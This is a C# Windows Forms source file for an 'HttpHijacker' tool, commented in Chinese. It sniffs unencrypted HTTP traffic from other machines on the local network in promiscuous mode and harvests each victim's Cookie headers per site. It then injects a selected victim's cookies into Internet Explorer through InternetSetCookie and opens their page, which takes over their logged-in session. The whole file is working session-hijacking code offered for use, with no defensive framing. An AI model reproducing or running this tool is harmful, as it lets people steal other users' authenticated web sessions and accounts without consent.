using PcapDotNet.Core;
using PcapDotNet.Packets;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Baibaomen.HttpHijacker
{
    public partial class FormHijacker : Form
    {
        /// <summary>
        /// 被嗅探到的各个设备的cookie集合。
        /// </summary>
        ConcurrentDictionary<string, ConcurrentDictionary<string, string>> clientCookies = new ConcurrentDictionary<string, ConcurrentDictionary<string, string>>();

        /// <summary>
        /// 本地网卡绑定的IP列表。
        /// </summary>
        List<string> localAddresses = new List<string>();

        public FormHijacker()
        {
            InitializeComponent();
        }

        private void FormHijacker_Load(object sender, EventArgs e)
        {
            StartHijack();
        }
        
        public void StartHijack()
        {
            Task.Run(delegate {
                IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;

                if (allDevices.Count == 0)
                {
                    MessageBox.Show("未找到网卡。请确认已安装WinPcap。");
                    return;
                }

                foreach (var selectedDevice in allDevices)
                {
                    localAddresses.AddRange(selectedDevice.Addresses.Select(x =>
                    {
                        if (x.Address.Family == SocketAddressFamily.Internet)
                            return ((IpV4SocketAddress)x.Address).Address.ToString();

                        if(x.Address.Family == SocketAddressFamily.Internet6)
                            return ((IpV6SocketAddress)x.Address).Address.ToString();

                        return null;
                    }).Where(x=>x != null));

                    Task.Run(delegate
                    {
                        PacketCommunicator communicator =
                            selectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1000);
                        if (communicator.DataLink.Kind != DataLinkKind.Ethernet)
                        {
                            return;
                        }

                        using (BerkeleyPacketFilter filter = communicator.CreateFilter("tcp and dst port 80"))
                        {
                            communicator.SetFilter(filter);
                        }
                        communicator.ReceivePackets(0, PacketHandler);
                    });
                }

                this.BeginInvoke(new EventHandler(delegate {
                    lbMsg.Text = "监听已启动";
                }));
            });
        }

        private void PacketHandler(Packet packet)
        {
            try
            {
                var sourceIP = packet.Ethernet.IpV4.Source.ToString();
                
                //排除自己的HTTP请求。
                if (localAddresses.Contains(sourceIP))
                    return;

                var http = packet?.Ethernet?.IpV4?.Tcp?.Http;
                if (http == null || http.Header == null) return;

                if (http.IsRequest && http.IsValid)
                {
                    String msg = http.Decode(Encoding.UTF8);

                    //只截获网页正文请求。
                    if (!string.IsNullOrEmpty(msg))
                    {
                        var lines = msg.Split(new string[] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);
                        var host = lines.FirstOrDefault(x => x.StartsWith("Host: "))?.Substring("Host: ".Length);
                        var cookie = lines.FirstOrDefault(x => x.StartsWith("Cookie: "))?.Substring("Cookie: ".Length);

                        if (string.IsNullOrEmpty(host)) return;

                        if (!string.IsNullOrEmpty(cookie))
                        {
                            var cCookies = clientCookies.GetOrAdd(sourceIP, new ConcurrentDictionary<string, string>());
                            cCookies.AddOrUpdate(host, cookie, (key, oldVal) => cookie);
                        }

                        if (msg.StartsWith("GET ") && (msg.Contains("\nAccept: text/html") || msg.Contains("\nAccept: text/plain")))//筛除对资源文件等的请求，让数据更干净。
                        {
                            var pathAndQuery = lines[0].Substring(0, lines[0].LastIndexOf(" HTTP/")).Substring("GET ".Length);
                            this.BeginInvoke(new EventHandler(delegate {
                                lstSessions.Items.Insert(0, $"{sourceIP}\t{DateTime.Now}\thttp://{host + pathAndQuery}");
                            }));
                        }
                    }
                }
            }
            catch//可能嗅探数据不完整，丢弃。
            {
            }
        }

        [DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool InternetSetCookie(string lpszUrlName, string lbszCookieName, string lpszCookieData);

        private void btnHijack_Click(object sender, EventArgs e)
        {
            var selected = lstSessions.SelectedItem;

            if (selected == null)
            {
                MessageBox.Show("请选择待劫持会话");
                return;
            }

            var segments = selected.ToString().Split('\t');
            var ip = segments[0];
            var url = segments[2];

            var cookies = clientCookies[ip];

            foreach (var domainCookie in cookies) //将cookie设置为浏览的cookie 
            {
                foreach (var item in domainCookie.Value.Split(';'))
                {
                    try
                    {
                        var name = item.Substring(0, item.IndexOf('=')).Trim();
                        var value = item.Substring(item.IndexOf('=') + 1);

                        InternetSetCookie(
                             "http://" + domainCookie.Key,
                             name,
                             value + ";expires=" + DateTime.UtcNow.AddMinutes(10).ToString("R"));
                    }
                    catch { }//有不符合格式的数据。可能嗅探数据不完整，丢弃。
                }
            }

            if (lstSessions.SelectedItem != null)
            {
                Process.Start("iexplore.exe", url);
            }
        }

    }
}
